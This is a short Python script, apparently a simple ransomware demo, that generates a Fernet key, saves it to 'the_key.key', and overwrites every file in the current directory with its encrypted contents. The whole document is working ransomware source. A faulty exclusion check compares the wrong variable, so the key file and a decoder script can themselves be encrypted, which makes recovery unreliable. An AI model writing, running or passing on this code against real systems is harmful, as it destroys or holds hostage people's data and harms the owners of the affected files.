import os
from cryptography.fernet import Fernet

files=[]

for file in os.listdir():
    if file=="simple_Ransomware.py" or files=="the_key.key" or files=="decode.py":
        continue
    files.append(file)

print(files)

key=Fernet.generate_key()
secret_key=Fernet(key)
print(key)

with open("the_key.key","wb") as thekey:
    thekey.write(key)

for file in files:
    with open(file,"rb") as thefile:
        content=thefile.read()
    content_encrypted= Fernet(key).encrypt(content)
    with open(file,"wb") as thefile:
        thefile.write(content_encrypted)

